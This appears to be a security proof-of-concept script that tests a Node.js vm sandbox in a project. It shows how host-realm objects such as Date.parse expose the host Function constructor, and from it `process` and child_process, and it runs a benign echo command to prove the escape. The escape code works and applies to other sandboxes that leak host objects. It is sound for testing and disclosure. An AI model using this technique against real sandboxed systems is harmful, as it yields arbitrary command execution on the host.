// goal-poc2: cross-realm Function leak → process → mainModule.require('child_process').
//
// The sandbox globals handed to vm.createContext (src/dwf/child-main.ts:215-246,
// 285-287) are HOST-realm objects: `Date.parse` is the real host Date.parse, and
// every `__host.*` function is a host closure. `.constructor` on any of them is the
// HOST Function constructor — on which the VM-context-only
// `codeGeneration: { strings: false }` (child-main.ts:288-292) has no effect, because
// V8 attributes the compilation to the native context of the Function being invoked.
//
// Steps, each logged so the parent journal records the outcome:
//  1. realm Function (control — expected EvalError);
//  2. host Function via Date.parse.constructor → `return process`;
//  3. process.mainModule.require('child_process') (canonical CJS route);
//  4. dynamic import('child_process') inside a host-compiled function
//     (child-main.js is ESM — package.json "type":"module" — so mainModule is
//     expected undefined and import() is the realistic module route);
//  5. if a child_process module is actually obtained, execSync a benign marker.
log("POC2-STEP1-start");

let step1: string;
try {
  const realmF: any = ({} as any).constructor.constructor;
  const p: any = realmF("return process")();
  step1 = p ? "LEAKED" : "blocked:no-process";
} catch (e) {
  step1 = "blocked:" + (e as Error).name;
}
log("POC2-REALM-FUNCTION:" + step1);

let hostProc = "unavailable";
try {
  const hostF: any = (Date.parse as any).constructor;
  const proc: any = hostF("return process")();
  hostProc = typeof proc;
} catch (e) {
  hostProc = "blocked:" + (e as Error).name;
}
log("POC2-HOST-PROCESS:" + hostProc);

let mainModuleReport = "no-attempt";
if (hostProc === "object") {
  try {
    const hostF: any = (Date.parse as any).constructor;
    const proc: any = hostF("return process")();
    const mm: any = proc.mainModule;
    mainModuleReport = mm ? "mainModule-ok:" + typeof mm.require : "mainModule-undefined";
  } catch (e) {
    mainModuleReport = "mainModule-err:" + (e as Error).message;
  }
}
log("POC2-MAIN-MODULE:" + mainModuleReport);

let execReport = "no-exec";
if (hostProc === "object") {
  try {
    const hostF: any = (Date.parse as any).constructor;
    const mod: any = await hostF("return import('child_process')")();
    const out: string = mod.default.execSync("echo PWNED-CS-ESCAPE").toString().trim();
    execReport = "EXEC:" + out;
  } catch (e) {
    execReport = "exec-err:" + (e as Error).name + ":" + String((e as Error).message ?? "").slice(0, 160);
  }
}
log("POC2-EXEC:" + execReport);

return { realmFunction: step1, hostProcess: hostProc, mainModule: mainModuleReport, exec: execReport };
